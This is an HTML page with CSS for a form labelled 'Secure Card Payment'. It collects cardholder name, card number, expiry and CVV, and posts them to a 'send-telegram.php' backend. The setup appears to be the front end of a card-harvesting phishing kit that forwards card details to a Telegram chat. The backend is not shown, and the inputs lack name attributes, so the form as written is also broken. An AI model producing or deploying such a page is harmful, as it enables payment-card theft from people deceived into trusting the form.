<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Card Payment</title>
  <style>
    /* Styling for the payment form wrapper */
    .payment-form {
      max-width: 400px;
      margin: 40px auto;
      padding: 25px;
      border: 1px solid #e0e0e0;
      border-radius: 8px;
      background-color: #ffffff;
      font-family: Arial, sans-serif;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
    }

    .payment-form h2 {
      margin-top: 0;
      margin-bottom: 20px;
      font-size: 20px;
      color: #333333;
      text-align: center;
    }

    .form-group {
      margin-bottom: 15px;
    }

    /* Arranges Expiry and CVV side-by-side */
    .form-row {
      display: flex;
      gap: 15px;
    }

    .form-row .form-group {
      flex: 1;
    }

    label {
      display: block;
      margin-bottom: 6px;
      font-size: 14px;
      font-weight: bold;
      color: #555555;
    }

    input {
      width: 100%;
      padding: 11px;
      border: 1px solid #cccccc;
      border-radius: 4px;
      font-size: 16px;
      box-sizing: border-box;
      transition: border-color 0.2s;
    }

    input:focus {
      border-color: #0070ba;
      outline: none;
    }

    /* Blue payment button styling */
    .pay-btn {
      width: 100%;
      padding: 12px;
      background-color: #0070ba;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }

    .pay-btn:hover {
      background-color: #005a9c;
    }
  </style>
</head>
<body>

  <!-- The Payment Form -->
  <!-- 💡 NOTICE: Action links directly to the backend PHP file -->
  <form class="payment-form" action="send-telegram.php" method="POST">
    <h2>Secure Card Payment</h2>
    
    <!-- Cardholder Name -->
    <div class="form-group">
      <label for="card-name">Cardholder Name</label>
      <input type="text" id="card-name" placeholder="John Doe" required>
    </div>

    <!-- Card Number -->
    <div class="form-group">
      <label for="card-number">Card Number</label>
      <input type="text" id="card-number" placeholder="1234 5678 9101 1121" maxlength="19" required>
    </div>

    <!-- Expiry and CVV Row -->
    <div class="form-row">
      <div class="form-group">
        
        <label for="expiry">Expiry Date</label>
        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
      </div>
      
      <div class="form-group">
        <label for="cvv">CVV</label>
        <input type="password" id="cvv" placeholder="123" maxlength="4" required>
      </div>
    </div>

    <!-- Submit Button -->
    <button type="submit" class="pay-btn">Pay Now</button>
  </form>

</body>
</html>
